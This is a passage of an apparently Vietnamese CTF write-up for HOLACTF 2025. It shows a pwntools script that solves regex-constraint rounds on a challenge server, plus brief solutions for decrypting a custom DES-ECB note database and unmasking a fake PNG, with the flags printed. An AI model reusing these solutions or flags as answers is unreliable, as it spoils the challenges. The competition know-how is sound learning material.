class="params">ch: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> ch == <span class="string">&#x27;d&#x27;</span>: <span class="keyword">return</span> <span class="built_in">set</span>(<span class="string">&#x27;0123456789&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ch == <span class="string">&#x27;w&#x27;</span>: <span class="keyword">return</span> <span class="built_in">set</span>(string.ascii_letters + string.digits + <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ch == <span class="string">&#x27;s&#x27;</span>: <span class="keyword">return</span> <span class="built_in">set</span>(<span class="string">&#x27; &#x27;</span>)          <span class="comment"># printable only -&gt; d√πng space cho \s</span></span><br><span class="line">    <span class="keyword">if</span> ch == <span class="string">&#x27;D&#x27;</span>: <span class="keyword">return</span> <span class="built_in">set</span>(ASCII_PRINTABLE) - <span class="built_in">set</span>(<span class="string">&#x27;0123456789&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ch == <span class="string">&#x27;W&#x27;</span>: <span class="keyword">return</span> <span class="built_in">set</span>(ASCII_PRINTABLE) - <span class="built_in">set</span>(string.ascii_letters + string.digits + <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ch == <span class="string">&#x27;S&#x27;</span>: <span class="keyword">return</span> <span class="built_in">set</span>(ASCII_PRINTABLE) - <span class="built_in">set</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="comment"># escape k√Ω t·ª± th∆∞·ªùng: \. \* \+ ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">set</span>(ch)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_charclass</span>(<span class="params">spec: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    spec c√≥ th·ªÉ l√†: &#x27;.&#x27;, &#x27;[...]&#x27;, &#x27;\\d&#x27;, &#x27;\\w&#x27;, m·ªôt k√Ω t·ª± ƒë∆°n...</span></span><br><span class="line"><span class="string">    Tr·∫£ v·ªÅ t·∫≠p k√Ω t·ª± ASCII printable h·ª£p l·ªá cho spec.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> spec == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">set</span>(ASCII_PRINTABLE)</span><br><span class="line">    <span class="keyword">if</span> spec.startswith(<span class="string">&#x27;\\&#x27;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(spec) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> expand_escape(spec[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(spec) == <span class="number">1</span> <span class="keyword">and</span> spec != <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">set</span>(spec)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.startswith(<span class="string">&#x27;[&#x27;</span>) <span class="keyword">and</span> spec.endswith(<span class="string">&#x27;]&#x27;</span>):</span><br><span class="line">        inner = spec[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">        neg = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> inner.startswith(<span class="string">&#x27;^&#x27;</span>):</span><br><span class="line">            neg = <span class="literal">True</span></span><br><span class="line">            inner = inner[<span class="number">1</span>:]</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        allowed = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(inner):</span><br><span class="line">            ch = inner[i]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">and</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(inner):</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                allowed |= expand_escape(inner[i])</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># range a-b</span></span><br><span class="line">            <span class="keyword">if</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(inner) <span class="keyword">and</span> inner[i+<span class="number">1</span>] == <span class="string">&#x27;-&#x27;</span> <span class="keyword">and</span> inner[i+<span class="number">2</span>] != <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">                start = inner[i]; end = inner[i+<span class="number">2</span>]</span><br><span class="line">                allowed |= <span class="built_in">set</span>(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(start), <span class="built_in">ord</span>(end)+<span class="number">1</span>))</span><br><span class="line">                i += <span class="number">3</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                allowed.add(ch); i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">set</span>(ASCII_PRINTABLE) - allowed) <span class="keyword">if</span> neg <span class="keyword">else</span> allowed</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fallback</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">set</span>(spec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_length</span>(<span class="params">pat: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="comment"># ∆∞u ti√™n (?=.&#123;N&#125;$)</span></span><br><span class="line">    m = re.findall(<span class="string">r&#x27;\(\?=\.&#123;(\d+)&#125;\$\)&#x27;</span>, pat)</span><br><span class="line">    <span class="keyword">if</span> m: <span class="keyword">return</span> <span class="built_in">int</span>(m[-<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># (?:.&#123;N&#125;)$</span></span><br><span class="line">    m = re.findall(<span class="string">r&#x27;\(\?:\.&#123;(\d+)&#125;\)\$&#x27;</span>, pat)</span><br><span class="line">    <span class="keyword">if</span> m: <span class="keyword">return</span> <span class="built_in">int</span>(m[-<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># ^.&#123;N&#125;$</span></span><br><span class="line">    m = re.findall(<span class="string">r&#x27;^\^\.&#123;(\d+)&#125;\$&#x27;</span>, pat)</span><br><span class="line">    <span class="keyword">if</span> m: <span class="keyword">return</span> <span class="built_in">int</span>(m[-<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># \A.&#123;N&#125;\Z</span></span><br><span class="line">    m = re.findall(<span class="string">r&#x27;\\A\.&#123;(\d+)&#125;\\Z&#x27;</span>, pat)</span><br><span class="line">    <span class="keyword">if</span> m: <span class="keyword">return</span> <span class="built_in">int</span>(m[-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_pattern</span>(<span class="params">blob: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="comment"># t√¨m d√≤ng c√≥ pattern ^...$</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">reversed</span>(blob.splitlines()):</span><br><span class="line">        s = line.strip()</span><br><span class="line">        <span class="keyword">if</span> (s.startswith(<span class="string">&#x27;^&#x27;</span>) <span class="keyword">and</span> s.endswith(<span class="string">&#x27;$&#x27;</span>)) <span class="keyword">or</span> (s.startswith(<span class="string">&#x27;\\A&#x27;</span>) <span class="keyword">and</span> s.endswith(<span class="string">&#x27;\\Z&#x27;</span>)):</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">    m = re.search(<span class="string">r&#x27;(\^.*\$)&#x27;</span>, blob, re.S)</span><br><span class="line">    <span class="keyword">return</span> m.group(<span class="number">1</span>) <span class="keyword">if</span> m <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">seeded_choice</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="comment"># ch·ªçn k√Ω t·ª± &quot;ƒë·∫πp&quot; ∆∞u ti√™n ch·ªØ s·ªë/ch·ªØ cho ƒë·ª° r·ªßi ro</span></span><br><span class="line">    pri = string.ascii_letters + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> pri:</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">in</span> s: <span class="keyword">return</span> ch</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">next</span>(<span class="built_in">iter</span>(s)) <span class="keyword">if</span> s <span class="keyword">else</span> random.choice(ASCII_PRINTABLE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clamp</span>(<span class="params">idx, L</span>):  <span class="comment"># ti·ªán √≠ch</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> &lt;= idx &lt; L</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">apply_pos_class</span>(<span class="params">poss, idx, spec</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> clamp(idx, <span class="built_in">len</span>(poss)): <span class="keyword">return</span></span><br><span class="line">    poss[idx] &amp;= parse_charclass(spec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">apply_run_class</span>(<span class="params">poss, start, k, spec</span>):</span><br><span class="line">    allowed = parse_charclass(spec)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        <span class="keyword">if</span> clamp(start+t, <span class="built_in">len</span>(poss)):</span><br><span class="line">            poss[start+t] &amp;= allowed</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">link_equal</span>(<span class="params">equal_pairs, a, b, k=<span class="number">1</span></span>):</span><br><span class="line">    <span class="comment"># k k√Ω t·ª± li√™n ti·∫øp b·∫±ng nhau gi·ªØa [a..a+k-1] v√† [b..b+k-1]</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        equal_pairs.append((a+t, b+t))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_constraints</span>(<span class="params">pat: <span class="built_in">str</span>, poss</span>):</span><br><span class="line">    L = <span class="built_in">len</span>(poss)</span><br><span class="line">    equal_pairs = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1) r√†ng bu·ªôc ƒë∆°n v·ªã: (?=.&#123;i&#125;[class])</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;\(\?=\.&#123;(\d+)&#125;((?:\[[^\]]+\])|\\.|.)\)&#x27;</span>, pat):</span><br><span class="line">        i = <span class="built_in">int</span>(m.group(<span class="number">1</span>)); spec = m.group(<span class="number">2</span>)</span><br><span class="line">        apply_pos_class(poss, i, spec)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2) ch·∫°y k k√Ω t·ª±: (?=.&#123;i&#125;[class]&#123;k&#125;)</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;\(\?=\.&#123;(\d+)&#125;((?:\[[^\]]+\])|\\.|.)\&#123;(\d+)\&#125;\)&#x27;</span>, pat):</span><br><span class="line">        i = <span class="built_in">int</span>(m.group(<span class="number">1</span>)); spec = m.group(<span class="number">2</span>); k = <span class="built_in">int</span>(m.group(<span class="number">3</span>))</span><br><span class="line">        apply_run_class(poss, i, k, spec)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3) backref nh√≥m t√™n, 1 k√Ω t·ª±: (?=.&#123;a&#125;(?P&lt;g&gt;[...]).&#123;b&#125;(?P=g))</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;\(\?=\.&#123;(\d+)&#125;\(\?P&lt;([A-Za-z]\w*)\&gt;((?:\[[^\]]+\])|\\.|.)\)\.\&#123;(\d+)\&#125;\(\?P=\2\)\)&#x27;</span>, pat):</span><br><span class="line">        a = <span class="built_in">int</span>(m.group(<span class="number">1</span>)); spec = m.group(<span class="number">3</span>); b = <span class="built_in">int</span>(m.group(<span class="number">4</span>))</span><br><span class="line">        j = a + <span class="number">1</span> + b</span><br><span class="line">        apply_pos_class(poss, a, spec); apply_pos_class(poss, j, spec)</span><br><span class="line">        <span class="keyword">if</span> clamp(a, L) <span class="keyword">and</span> clamp(j, L): link_equal(equal_pairs, a, j, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4) backref nh√≥m s·ªë, 1 k√Ω t·ª±: (?=.&#123;a&#125;([...]).&#123;b&#125;\1)</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;\(\?=\.&#123;(\d+)&#125;\(((?:\[[^\]]+\])|\\.|.)\)\.\&#123;(\d+)\&#125;\\1\)&#x27;</span>, pat):</span><br><span class="line">        a = <span class="built_in">int</span>(m.group(<span class="number">1</span>)); spec = m.group(<span class="number">2</span>); b = <span class="built_in">int</span>(m.group(<span class="number">3</span>))</span><br><span class="line">        j = a + <span class="number">1</span> + b</span><br><span class="line">        apply_pos_class(poss, a, spec); apply_pos_class(poss, j, spec)</span><br><span class="line">        <span class="keyword">if</span> clamp(a, L) <span class="keyword">and</span> clamp(j, L): link_equal(equal_pairs, a, j, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5) backref nh√≥m t√™n, nhi·ªÅu k√Ω t·ª±: (?=.&#123;a&#125;(?P&lt;g&gt;[...]&#123;k&#125;).&#123;b&#125;(?P=g))</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;\(\?=\.&#123;(\d+)&#125;\(\?P&lt;([A-Za-z]\w*)\&gt;((?:\[[^\]]+\])|\\.|.)\&#123;(\d+)\&#125;\)\.\&#123;(\d+)\&#125;\(\?P=\2\)\)&#x27;</span>, pat):</span><br><span class="line">        a = <span class="built_in">int</span>(m.group(<span class="number">1</span>)); spec = m.group(<span class="number">3</span>); k = <span class="built_in">int</span>(m.group(<span class="number">4</span>)); b = <span class="built_in">int</span>(m.group(<span class="number">5</span>))</span><br><span class="line">        j = a + k + b</span><br><span class="line">        apply_run_class(poss, a, k, spec); apply_run_class(poss, j, k, spec)</span><br><span class="line">        <span class="keyword">if</span> clamp(a, L) <span class="keyword">and</span> clamp(j, L): link_equal(equal_pairs, a, j, k)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 6) backref nh√≥m s·ªë, nhi·ªÅu k√Ω t·ª±: (?=.&#123;a&#125;([...]&#123;k&#125;).&#123;b&#125;\1)</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;\(\?=\.&#123;(\d+)&#125;\(((?:\[[^\]]+\])|\\.|.)\&#123;(\d+)\&#125;\)\.\&#123;(\d+)\&#125;\\1\)&#x27;</span>, pat):</span><br><span class="line">        a = <span class="built_in">int</span>(m.group(<span class="number">1</span>)); spec = m.group(<span class="number">2</span>)[:-<span class="number">3</span>]; k = <span class="built_in">int</span>(m.group(<span class="number">3</span>)); b = <span class="built_in">int</span>(m.group(<span class="number">4</span>))</span><br><span class="line">        j = a + k + b</span><br><span class="line">        apply_run_class(poss, a, k, spec); apply_run_class(poss, j, k, spec)</span><br><span class="line">        <span class="keyword">if</span> clamp(a, L) <span class="keyword">and</span> clamp(j, L): link_equal(equal_pairs, a, j, k)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 7) r√†ng bu·ªôc &quot;√≠t nh·∫•t k l·∫ßn ·ªü ƒë√¢u ƒë√≥&quot;: (?=(?:.*SPEC)&#123;k&#125;)</span></span><br><span class="line">    <span class="comment">#    -&gt; √©p ch·ªçn k v·ªã tr√≠ r·∫£i ƒë·ªÅu ƒë·ªÉ th·ªèa SPEC.</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;\(\?=\(\?:\.\*((?:\[[^\]]+\])|\\.|.)\)\&#123;(\d+)\&#125;\)&#x27;</span>, pat):</span><br><span class="line">        spec = m.group(<span class="number">1</span>); k = <span class="built_in">int</span>(m.group(<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">if</span> L == <span class="number">0</span> <span class="keyword">or</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        pos_list = [<span class="built_in">int</span>((t+<span class="number">1</span>) * L / (k+<span class="number">1</span>)) <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(k)]  <span class="comment"># r·∫£i ƒë·ªÅu</span></span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> pos_list:</span><br><span class="line">            apply_pos_class(poss, idx, spec)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># propagate equalities</span></span><br><span class="line">    changed = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">while</span> changed:</span><br><span class="line">        changed = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> a, b <span class="keyword">in</span> equal_pairs:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (clamp(a, L) <span class="keyword">and</span> clamp(b, L)): <span class="keyword">continue</span></span><br><span class="line">            inter = poss[a] &amp; poss[b]</span><br><span class="line">            <span class="keyword">if</span> inter <span class="keyword">and</span> inter != poss[a]:</span><br><span class="line">                poss[a] = <span class="built_in">set</span>(inter); changed = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> inter <span class="keyword">and</span> inter != poss[b]:</span><br><span class="line">                poss[b] = <span class="built_in">set</span>(inter); changed = <span class="literal">True</span></span><br><span class="line">            <span class="comment"># n·∫øu inter r·ªóng, gi·ªØ nguy√™n (ƒë·ªÉ fallback random x·ª≠ l√Ω)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> equal_pairs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_candidate</span>(<span class="params">pat: <span class="built_in">str</span></span>):</span><br><span class="line">    L = extract_length(pat)</span><br><span class="line">    <span class="keyword">if</span> L <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># n·∫øu kh√¥ng ch·ªâ r√µ, ch·ªçn ƒë·ªô d√†i trung b√¨nh an to√†n</span></span><br><span class="line">        L = <span class="built_in">min</span>(<span class="number">32</span>, <span class="number">20</span>)</span><br><span class="line">    poss = [<span class="built_in">set</span>(ASCII_PRINTABLE) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(L)]</span><br><span class="line">    eq = parse_constraints(pat, poss)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ch·ªçn ƒë·∫°i di·ªán &quot;ƒë·∫πp&quot;</span></span><br><span class="line">    cand = [seeded_choice(p) <span class="keyword">for</span> p <span class="keyword">in</span> poss]</span><br><span class="line">    <span class="comment"># √°p d·ª•ng b·∫±ng nhau</span></span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> eq:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= a &lt; L <span class="keyword">and</span> <span class="number">0</span> &lt;= b &lt; L:</span><br><span class="line">            cand[b] = cand[a]</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span>.join(cand)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> re.fullmatch(pat, s):</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">except</span> re.error:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Fallback: random c√≥ ki·ªÉm tra, nhanh</span></span><br><span class="line">    POP = [<span class="built_in">tuple</span>(p <span class="keyword">if</span> p <span class="keyword">else</span> <span class="built_in">set</span>(ASCII_PRINTABLE)) <span class="keyword">for</span> p <span class="keyword">in</span> poss]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6000</span>):</span><br><span class="line">        t = [random.choice(POP[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L)]</span><br><span class="line">        <span class="keyword">for</span> a, b <span class="keyword">in</span> eq:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= a &lt; L <span class="keyword">and</span> <span class="number">0</span> &lt;= b &lt; L:</span><br><span class="line">                t[b] = t[a]</span><br><span class="line">        s = <span class="string">&#x27;&#x27;</span>.join(t)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> re.fullmatch(pat, s):</span><br><span class="line">                <span class="keyword">return</span> s</span><br><span class="line">        <span class="keyword">except</span> re.error:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># l·∫ßn cu·ªëi th·ª≠ &quot;hill-climb&quot; nh·∫π</span></span><br><span class="line">    s = <span class="built_in">list</span>(s)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        i = random.randrange(L)</span><br><span class="line">        s[i] = random.choice(POP[i])</span><br><span class="line">        <span class="keyword">for</span> a, b <span class="keyword">in</span> eq:</span><br><span class="line">            <span class="keyword">if</span> i == a <span class="keyword">and</span> <span class="number">0</span> &lt;= b &lt; L: s[b] = s[a]</span><br><span class="line">            <span class="keyword">if</span> i == b <span class="keyword">and</span> <span class="number">0</span> &lt;= a &lt; L: s[a] = s[b]</span><br><span class="line">        x = <span class="string">&#x27;&#x27;</span>.join(s)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> re.fullmatch(pat, x):</span><br><span class="line">                <span class="keyword">return</span> x</span><br><span class="line">        <span class="keyword">except</span> re.error:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> HOST PORT&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    host, port = sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ƒë·ªçc t·ªõi prompt ƒë·∫ßu</span></span><br><span class="line">    buf = io.recvuntil(<span class="string">b&quot;Answer&gt;&quot;</span>, timeout=<span class="number">5</span>).decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    rounds = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pat = extract_pattern(buf)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> pat:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] Kh√¥ng l·∫•y ƒë∆∞·ª£c pattern, d·ªØ li·ªáu:\n&quot;</span>, buf)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        ans = build_candidate(pat)</span><br><span class="line">        io.sendline(ans.encode())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># nh·∫≠n next chunk (c√≥ th·ªÉ k√®m ‚ÄúCorrect!‚Äù ho·∫∑c flag)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            buf = io.recvuntil(<span class="string">b&quot;Answer&gt;&quot;</span>, timeout=<span class="number">3</span>).decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="comment"># c√≥ th·ªÉ ƒë√£ in flag r·ªìi ƒë√≥ng</span></span><br><span class="line">            tail = io.recvall(timeout=<span class="number">2</span>).decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            buf = tail</span><br><span class="line"></span><br><span class="line">        m = re.search(<span class="string">r&#x27;HOLACTF\&#123;[^&#125;]+\&#125;&#x27;</span>, buf)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="built_in">print</span>(m.group(<span class="number">0</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        rounds += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> rounds &gt;= <span class="number">12</span> <span class="keyword">and</span> <span class="keyword">not</span> m:</span><br><span class="line">            <span class="comment"># ph√≤ng tr∆∞·ªùng h·ª£p format kh√°c, in log ƒë·ªÉ b·∫°n xem</span></span><br><span class="line">            <span class="built_in">print</span>(buf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    random.seed()  <span class="comment"># m·ªói round seed kh√°c</span></span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/ry27yMfcgl.png" alt="image"><br>Flag: <code>HOLACTF&#123;f1989db679d2&#125;</code></p>
<h3 id="Sanity-Check"><a href="#Sanity-Check" class="headerlink" title="Sanity Check"></a>Sanity Check</h3><p><img src="https://hackmd.io/_uploads/SyifzfGqxe.png" alt="image"></p>
<ul>
<li>V·ªõi g·ª£i √Ω c√≥ s·∫Ω trong ƒë·ªÅ t√¥i s·∫Ω inspect element t·ª´ng post v√† t√¨m th·∫•y flag ·ªü post d√†i nh·∫•t <a target="_blank" rel="noopener" href="https://holactf2025.ehc-fptu.club/posts/afc27b80">https://holactf2025.ehc-fptu.club/posts/afc27b80</a>.</li>
<li>V√† t√¨m chu·ªói format HOLACTF{}.<br><img src="https://hackmd.io/_uploads/BJvKMMM5lg.png" alt="image"><blockquote>
<ul>
<li>FLAG: HOLACTF{th1s_s4n1ty_ch3ck_1s_w1ld}****</li>
</ul>
</blockquote>
</li>
</ul>
<h3 id="lunaDBv2"><a href="#lunaDBv2" class="headerlink" title="lunaDBv2"></a>lunaDBv2</h3><p><img src="https://hackmd.io/_uploads/Bkh07Mz9gg.png" alt="image"></p>
<ul>
<li>Trong main.rs ta th·∫•y database ƒë∆∞·ª£c thi·∫øt k·∫ø v·ªõi format t√πy ch·ªânh:</li>
<li>C√°c section:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SIG = b&quot;LUNA&quot;</span><br><span class="line">H_START = FF1337FF, H_END = FFCAFEFF</span><br><span class="line">D_START = FF7270FF, D_END = FFEDEDFF</span><br><span class="line">F_START = FFDEADFF, F_END = FFBEEFFF</span><br></pre></td></tr></table></figure>

<p>‚Üí Header ch·ª©a th√¥ng tin DB, ti·∫øp theo l√† Data section (c√°c notes), cu·ªëi c√πng l√† File section (c√°c keys).</p>
<ul>
<li>M√£ h√≥a:<blockquote>
<p>N·ªôi dung c·ªßa m·ªói note ƒë∆∞·ª£c m√£ h√≥a b·∫±ng DES ECB (Cipher::des_ecb()).<br>Kh√≥a l√† 8 byte, sinh ng·∫´u nhi√™n.<br>C√°c kh√≥a ƒë∆∞·ª£c l∆∞u trong cu·ªëi file (gi·ªØa F_START v√† F_END).<br>key_index_field l∆∞u ch·ªâ s·ªë bit ƒë·ªÉ bi·∫øt note d√πng kh√≥a n√†o.</p>
</blockquote>
</li>
<li>B∆∞·ªõc 1: Parse file<blockquote>
<p>Vi·∫øt parser nh·ªè ƒë·ªÉ:<br>T√¨m D_START ‚Ä¶ D_END<br>ƒê·ªçc t·ª´ng note theo format (c√≥ LEB128 string, int64 timestamps‚Ä¶)<br>L·∫•y key_field v√† enc_bytes</p>
</blockquote>
</li>
<li>B∆∞·ªõc 2: Gi·∫£i m√£ DES<blockquote>
<p>Ch·ªçn kh√≥a d·ª±a tr√™n bitmask (key_index_field).<br>Gi·∫£i m√£ DES&#x2F;ECB.<br>K·∫øt qu·∫£ c√≥ th√™m padding NULL (\x00) thay v√¨ PKCS7 ‚Üí ch·ªâ c·∫ßn .rstrip(b‚Äù\x00‚Äù).</p>
</blockquote>
</li>
<li>B∆∞·ªõc 3: T√¨m flag<blockquote>
<p>Sau khi gi·∫£i m√£ ~5000 notes, ki·ªÉm tra chu·ªói ch·ª©a ‚ÄúHOLACTF{‚Äú.</p>
</blockquote>
</li>
</ul>
<blockquote>
<p><strong>FLAG: HOLACTF{4_c0Ol_Cu5t0m_f1lE_5truC7}</strong></p>
</blockquote>
<h3 id="Weird-PNG"><a href="#Weird-PNG" class="headerlink" title="Weird PNG"></a>Weird PNG</h3><p><img src="https://hackmd.io/_uploads/rk8cHzGcll.png" alt="image"></p>
<ul>
<li><p>Nh·∫≠n di·ªán ‚ÄúPNG l·∫°‚Äù th·ª±c ra l√† boot sector</p>
</li>
<li><p>File b·∫Øt ƒë·∫ßu b·∫±ng ch·ªØ k√Ω PNG: 89 50 4E 47 0D 0A 1A 0A.</p>
</li>
<li><p>Chunk IHDR khai b√°o Width &#x3D; 255, Height &#x3D; 255, Bit depth &#x3D; 8, Color type &#x3D; 2. CRC sai&#x2F;b·∫•t th∆∞·ªùng ‚Üí nghi ng·ª•y trang.</p>
</li>
